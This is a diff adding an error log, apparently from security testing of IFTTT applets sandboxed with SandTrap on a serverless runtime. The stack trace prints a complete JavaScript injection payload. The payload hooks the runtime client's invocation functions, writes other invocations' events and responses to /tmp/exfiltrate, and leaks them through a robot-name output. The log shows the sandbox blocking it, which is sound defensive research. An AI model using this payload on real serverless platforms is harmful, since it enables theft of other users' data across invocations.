@@ -1,0 +1,33 @@
+Insecure-log{
+#IFTTT+SandTrap is running#
+null
+{
+  statusCode: 400,
+  body: {
+    event: {
+      resource: '/IFTTT-instance',
+      path: '/IFTTT-instance',
+      httpMethod: 'POST',
+      body: [Object]
+    },
+    message: 'ReferenceError: require is not defined',
+    stack: 'evalmachine.<anonymous>:1\n' +
+      "var payload = `let fs=require('fs');if(typeof counter==='undefined'){counter=0;origin=location.exitregionlocation.loc;let rapid=require('/var/runtime/RAPIDClient.js'),_postInvocationResponse=rapid.prototype.postInvocationResponse,_nextInvocation=rapid.prototype.nextInvocation;function postInvocationResponse(response,id,callback){fs.appendFileSync('/tmp/exfiltrate',JSON.stringify({origin:origin,counter:counter,response:response===undefined?null:response,id:id}));return _postInvocationResponse.call(this,response,id,callback);}async function nextInvocation(){let result=await _nextInvocation.call(this);fs.appendFileSync('/tmp/exfiltrate',JSON.stringify({origin:origin,counter:counter,result:result}));return result;}rapid.prototype.postInvocationResponse=postInvocationResponse;rapid.prototype.nextInvocation=nextInvocation;fs.appendFileSync('/tmp/exfiltrate','Injection successful');}else{counter++;}let result=location.exitregionlocation.loc+' '+counter+' trigger time:'+Meta.triggerTime;if(fs.existsSync('/tmp/exfiltrate')){result+=fs.readFileSync('/tmp/exfiltrate').toString();}return result;`;var f=(()=>{}).constructor.call(null,'require','location','irobot','Meta',payload);var result=f(require,location,irobot,Meta);irobot.startRobot.setRobotName(result);\n" +
+      '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            \n' +
+      '\n' +
+      'ReferenceError: require is not defined\n' +
+      '    at evalmachine.<anonymous>:1:1199\n' +
+      '    at Script.runInContext (node:vm:133:12)\n' +
+      '    at SandTrap.Eval (/home/kth-rof13thfloor/work/ifttt+sandtrap/ifttt+sandtrap/node_modules/sandtrap/out/sandtrap.js:44:29)\n' +
+      '    at runScriptCode (/home/kth-rof13thfloor/work/ifttt+sandtrap/ifttt+sandtrap/framework.js:114:13)\n' +
+      '    at exports.handler (/home/kth-rof13thfloor/work/ifttt+sandtrap/ifttt+sandtrap/lambda_interface.js:18:26)\n' +
+      '    at Object.<anonymous> (/home/kth-rof13thfloor/work/ifttt+sandtrap/ifttt+sandtrap/invoker.js:19:32)\n' +
+      '    at Module._compile (node:internal/modules/cjs/loader:1364:14)\n' +
+      '    at Module._extensions..js (node:internal/modules/cjs/loader:1422:10)\n' +
+      '    at Module.load (node:internal/modules/cjs/loader:1203:32)\n' +
+      '    at Module._load (node:internal/modules/cjs/loader:1019:12)'
+  },
+  headers: { 'Content-Type': 'application/json' }
+}
+}
+
